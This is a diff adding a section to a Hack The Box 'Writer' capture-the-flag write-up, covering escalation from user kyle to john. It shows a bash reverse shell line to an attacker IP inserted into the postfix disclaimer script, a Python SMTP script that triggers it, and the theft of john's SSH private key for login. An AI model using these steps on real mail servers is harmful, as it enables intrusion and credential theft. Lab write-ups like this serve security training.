@@ -232,4 +232,169 @@ kyle@writer:~$ cat user.txt
 <Redacted user flag>
 kyle@writer:~$ 
 ```
+
+## Obtaining root flag
+
+Firstly, we will check if the user ```kyle``` is able to execute any programs with root privileges. It seems that ```kyle``` cannot execute any programs with root privileges.
+
+```
+kyle@writer:~$ sudo -l
+[sudo] password for kyle: 
+Sorry, user kyle may not run sudo on writer.
+```
+
+Next, we will run ```linpeas``` script on the SSH server to discover potential privilege escalation vectors. From the output, we have discovered that there are mail applications running on the SSH server and we have a ```postfix``` service which is an SMTP.
+
+![mail applications running on the server](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/mail_applications.PNG)
+
+![Postfix](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/smtp_postfix.PNG)
+
+From ```/etc/postfix```, we were also able to discover the addresses of Kyle and root user.
+
+```
+kyle@writer:~$ cd /etc/postfix && ls
+disclaimer            dynamicmaps.cf    main.cf.proto  master.cf.proto  postfix-script
+disclaimer_addresses  dynamicmaps.cf.d  makedefs.out   postfix-files    post-install
+disclaimer.txt        main.cf           master.cf      postfix-files.d  sasl
+kyle@writer:/etc/postfix$ cat disclaimer_addresses
+root@writer.htb
+kyle@writer.htb
+```
+Now, we will modify the ```/etc/postfix/disclaimer``` file to create a reverse shell command (NOTE the extra bash command)
+
+```
+#!/bin/sh
+# Localize these.
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
+bash -i &>/dev/tcp/10.10.16.7/4444 0>&1
+
+# Get disclaimer addresses
+DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
+
+# Exit codes from <sysexits.h>
+EX_TEMPFAIL=75
+EX_UNAVAILABLE=69
+
+# Clean up when done or when aborting.
+trap "rm -f in.$$" 0 1 2 3 15
+
+# Start processing.
+cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
+$EX_TEMPFAIL; }
+
+cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }
+
+# obtain From address
+from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`
+
+if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
+  /usr/bin/altermime --input=in.$$ \
+                   --disclaimer=/etc/postfix/disclaimer.txt \
+                   --disclaimer-html=/etc/postfix/disclaimer.txt \
+                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
+                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
+fi
+
+$SENDMAIL "$@" <in.$$
+
+exit $?
+```
+
+Next, we will write a python script to send a SMTP message 
+
+```
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import sys
+
+host = "127.0.0.1"
+port = 25
+
+# create message object instance
+msg = MIMEMultipart()
+
+# setup the parameters of the message
+password = "" 
+msg['From'] = "kyle@writer.htb"
+msg['To'] = "kyle@writer.htb"
+msg['Subject'] = "This is not a drill!"
+
+# payload 
+message = ("test message")
+
+print("[*] Payload is generated : %s" % message)
+
+msg.attach(MIMEText(message, 'plain'))
+server = smtplib.SMTP(host,port)
+
+if server.noop()[0] != 250:
+    print("[-]Connection Error")
+    exit()
+
+server.starttls()
+
+# Uncomment if log-in with authencation
+# server.login(msg['From'], password)
+
+server.sendmail(msg['From'], msg['To'], msg.as_string())
+server.quit()
+
+print("[***]successfully sent email to %s:" % (msg['To']))
+```
+
+Afterwards, we will copy the modified disclaimer file to ```/etc/postfix/disclaimer``` (because I notice that the modified /etc/postfix/disclaimer gets overwritten every time I execute the script) and execute the script to get a reverse shell. 
+
+```
+kyle@writer:~$ cp disclaimer /etc/postfix/disclaimer && python3 send.py
+[*] Payload is generated : test message
+[***]successfully sent email to kyle@writer.htb:
+```
+
+Now, we will have obtained the reverse shell. We will first stabilize the shell. However, we noticed that we have only obtained the reverse shell for the user ```john```.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 50386
+bash: cannot set terminal process group (1243409): Inappropriate ioctl for device
+bash: no job control in this shell
+john@writer:/var/spool/postfix$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<ix$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+john@writer:/var/spool/postfix$ export TERM=xterm
+export TERM=xterm
+john@writer:/var/spool/postfix$ stty cols 132 rows 34
+stty cols 132 rows 34
+john@writer:/var/spool/postfix$ id
+id
+uid=1001(john) gid=1001(john) groups=1001(john)
+```
+
+Next, what we have to do is to save the ```id_rsa``` file into our local machine so that we can SSH into ```john```
+
+```
+john@writer:/$ cd /home/john/.ssh
+cd /home/john/.ssh
+john@writer:/home/john/.ssh$ ls -la
+ls -la
+total 20
+drwx------ 2 john john 4096 Jul  9 12:29 .
+drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..
+-rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys
+-rw------- 1 john john 2602 Jul  9 12:29 id_rsa
+-rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub
+john@writer:/home/john/.ssh$ cat id_rsa
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nano id_rsa   
+                                                                                                 
+┌──(kali㉿kali)-[~/Desktop]
+└─$ chmod 600 id_rsa 
+
+──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i id_rsa john@10.10.11.101                                     
+Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
+john@writer:~$ 
 ```
